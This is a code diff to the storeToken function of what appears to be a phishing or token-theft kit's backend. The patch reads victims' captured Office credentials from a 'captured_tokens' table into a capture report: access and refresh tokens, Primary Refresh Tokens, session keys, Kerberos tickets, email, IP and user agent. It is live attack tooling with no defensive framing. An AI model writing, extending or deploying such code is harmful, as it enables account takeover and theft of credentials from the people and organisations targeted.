@@ -681,24 +681,32 @@ async function storeToken(job, tokenData, responseCookies = []) {
     try {
       const { buildCaptureCaption, buildCaptureFileContent } = require('../routes/capture');
       const reportTokenType = job.mode === 'cookie' ? 'cookie' : 'token';
+
+      // Load stored token row so Kerberos fields are defined if already saved
+      const [tokenRows] = await db.query(
+        'SELECT id, email, token_type, tenant, account_type, ip_address, user_agent, prt, session_key_jwe, device_tenant_id, tgt_ad, tgt_cloud, kerberos_top_level_names, tgt_cloud_sessionkey FROM captured_tokens WHERE id = ?',
+        [tokenId]
+      );
+      const tokenRow = tokenRows.length > 0 ? tokenRows[0] : null;
+
       const reportData = {
-        email,
+        email: email || tokenRow?.email || null,
         templateType: 'office',
         tokenType: reportTokenType,
         accessToken: tokenData.access_token || null,
         refreshToken: tokenData.refresh_token || null,
         idToken: tokenData.id_token || null,
-        prt: prt || null,
-        sessionKeyJwe: sessionKeyJwe || null,
-        deviceTenantId: deviceTenantId || null,
-        tgtAd: tgtAd || null,
-        tgtCloud: tgtCloud || null,
-        kerberosTopLevelNames: kerberosTopLevelNames || null,
-        tgtCloudSessionkey: tgtCloudSessionkey || null,
-        accountType,
-        tenant,
-        ip: ipAddress,
-        userAgent,
+        prt: prt || tokenRow?.prt || null,
+        sessionKeyJwe: sessionKeyJwe || tokenRow?.session_key_jwe || null,
+        deviceTenantId: deviceTenantId || tokenRow?.device_tenant_id || null,
+        tgtAd: tokenRow?.tgt_ad || null,
+        tgtCloud: tokenRow?.tgt_cloud || null,
+        kerberosTopLevelNames: tokenRow?.kerberos_top_level_names || null,
+        tgtCloudSessionkey: tokenRow?.tgt_cloud_sessionkey || null,
+        accountType: accountType || tokenRow?.account_type || 'work_school',
+        tenant: tenant || tokenRow?.tenant || null,
+        ip: ipAddress || tokenRow?.ip_address || null,
+        userAgent: userAgent || tokenRow?.user_agent || null,
         linkId: job.link_id,
         tokenId,
       };
